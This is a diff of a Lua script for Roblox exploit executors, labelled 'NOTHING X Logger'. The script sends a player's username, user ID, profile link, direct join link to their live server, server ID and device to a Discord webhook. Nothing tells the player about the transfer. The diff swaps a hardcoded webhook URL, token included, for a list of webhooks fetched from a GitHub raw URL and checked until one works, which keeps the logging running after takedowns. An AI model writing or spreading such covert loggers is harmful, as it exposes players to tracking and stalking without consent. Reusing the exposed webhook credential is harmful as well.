@@ -1,13 +1,34 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-
+local requestFunc = syn and syn.request or http_request or request or (fluxus and fluxus.request)
+local RawURL = "https://raw.githubusercontent.com/OverlordCryx/X_/refs/heads/main/DC/DC.file"
+local Webhooks = {}
+local success, response = pcall(function()
+    return requestFunc({Url = RawURL, Method = "GET"})
+end)
+if success and response and response.Body then
+    for webhook in string.gmatch(response.Body, "[^\r\n]+") do
+        webhook = webhook:gsub("%s+", "")
+        if webhook ~= "" then table.insert(Webhooks, webhook) end
+    end
+end
+local function VerifyWebhook(webhook)
+    local s, r = pcall(function() return requestFunc({Url = webhook, Method = "GET"}) end)
+    if not s or not r or not r.Body then return false end
+    local ds, data = pcall(function() return HttpService:JSONDecode(r.Body) end)
+    if not ds or not data then return false end
+    if data.code == 10015 then return false end
+    return data.name and data.name ~= ""
+end
+local WebhookURL = nil
+for _, wh in ipairs(Webhooks) do
+    if VerifyWebhook(wh) then WebhookURL = wh break end
+end
+if not WebhookURL then warn("") return end
 local player = Players.LocalPlayer
-
-local WebhookURL = "https://discord.com/api/webhooks/1500279870973022278/MW8hTvLUKg502Nosy-yA-Frfn6l_hP-tOWLr8qkJg-QovslFJEyDu2VJNT_xvi9qmZtO"
 local placeId = game.PlaceId
 local matchType = "Unknown"
-
 if placeId == 12177325772 then
     matchType = "4v4"
 elseif placeId == 127060568647054 then
@@ -15,85 +36,39 @@ elseif placeId == 127060568647054 then
 elseif placeId == 126195208568849 then
     matchType = "Pro 7v7"
 end
-
 local platform = UserInputService:GetPlatform()
 local device = "Unknown"
-
-if platform == Enum.Platform.Windows 
-or platform == Enum.Platform.OSX 
-or platform == Enum.Platform.Linux 
-or platform == Enum.Platform.UWP then
+if platform == Enum.Platform.Windows or platform == Enum.Platform.OSX or platform == Enum.Platform.Linux or platform == Enum.Platform.UWP then
     device = "PC"
-elseif platform == Enum.Platform.IOS 
-or platform == Enum.Platform.Android then
+elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
     device = "Mobile"
 end
-
 local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
 local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?gameInstanceId=" .. game.JobId
-
 local data = {
     username = "NOTHING_X",
     embeds = {{
         title = "NOTHING X (SLS)",
         color = 16753920,
-
         fields = {
-            {
-                name = "Username",
-                value = player.Name,
-                inline = true
-            },
-            {
-                name = "User ID",
-                value = tostring(player.UserId),
-                inline = true
-            },
-            {
-                name = "He Play",
-                value = "[SERVER](" .. joinLink .. ")",
-                inline = false
-            },
-            {
-                name = "Profile Player",
-                value = "[VIEW PROFILE](" .. profileLink .. ")",
-                inline = false
-            },
-            {
-                name = "Server ID",
-                value = tostring(game.JobId),
-                inline = true
-            },
-            {
-                name = "Match Type",
-                value = matchType,
-                inline = true
-            },
-            {
-                name = "Device",
-                value = device,
-                inline = true
-            }
+            {name = "Username", value = player.Name, inline = true},
+            {name = "User ID", value = tostring(player.UserId), inline = true},
+            {name = "He Play", value = "[SERVER](" .. joinLink .. ")", inline = false},
+            {name = "Profile Player", value = "[VIEW PROFILE](" .. profileLink .. ")", inline = false},
+            {name = "Server ID", value = tostring(game.JobId), inline = true},
+            {name = "Match Type", value = matchType, inline = true},
+            {name = "Device", value = device, inline = true}
         },
-
-        footer = {
-            text = "NOTHING X Logger"
-        },
-
+        footer = {text = "NOTHING X Logger"},
         timestamp = DateTime.now():ToIsoDate()
     }}
 }
-
 pcall(function()
-    local requestFunc = syn and syn.request or http_request or request
-
-    if requestFunc then
+    if requestFunc and WebhookURL then
         requestFunc({
             Url = WebhookURL,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
     end
